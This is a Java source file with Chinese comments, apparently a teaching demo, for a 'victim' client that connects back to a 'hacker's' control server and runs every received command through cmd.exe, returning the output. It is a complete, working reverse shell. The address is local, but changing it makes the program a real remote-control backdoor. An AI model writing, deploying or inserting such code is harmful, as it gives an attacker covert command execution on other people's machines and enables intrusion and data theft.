import java.io.*;
import java.net.*;

public class VictimClient {
    public static void main(String[] args) {
        String serverIp = "127.0.0.1";
        int port = 9999;

        try {
            System.out.println("[Victim] 正在潜伏... 尝试连接控制端 " + serverIp + ":" + port);
            // 1. 主动拨号连接黑客的服务器
            Socket socket = new Socket(serverIp, port);
            System.out.println("[Victim] 成功连上控制端！随时准备执行命令。");

            // 2. 获取听筒（收命令）和话筒（回传结果）
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            // 注意：发给 Server 的结果最好也用 GBK 编码，这样两边统一，不会出现中文乱码
            PrintWriter out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), "GBK"), true);

            String cmd;
            // 3. 死循环：只要黑客发来命令，就一直执行
            while ((cmd = in.readLine()) != null) {
                if ("exit".equalsIgnoreCase(cmd)) {
                    break;
                }

                System.out.println("[Victim] 收到控制端指令: " + cmd);

                try {
                    // ================== 【核心执行代码】 ==================
                    // 调用底层 Runtime 执行命令。
                    // Windows 系统下必须加 "cmd.exe /c "，否则像 dir 这种内置命令会报错找不到
                    Process process = Runtime.getRuntime().exec("cmd.exe /c " + cmd);

                    // 抓取命令执行的正常输出 (比如 whoami 的结果)
                    BufferedReader processOut = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                    String line;
                    while ((line = processOut.readLine()) != null) {
                        out.println(line); // 原封不动地顺着网线发回给控制端
                    }

                    // 抓取命令执行的错误输出 (比如黑客敲错命令了，报错信息也要发回去)
                    BufferedReader processErr = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GBK"));
                    while ((line = processErr.readLine()) != null) {
                        out.println(line);
                    }

                    // 给控制端发一个提示符，表示当前命令跑完了
                    out.println("\n[+] 执⾏完毕，等待下一条指令 > ");
                    // ======================================================

                } catch (Exception e) {
                    out.println("[-] 命令执行失败: " + e.getMessage());
                }
            }

            socket.close();
            System.out.println("[Victim] 控制端已断开。");

        } catch (IOException e) {
            System.out.println("[-] 连不上控制端，是不是 Server 没开？");
        }
    }
}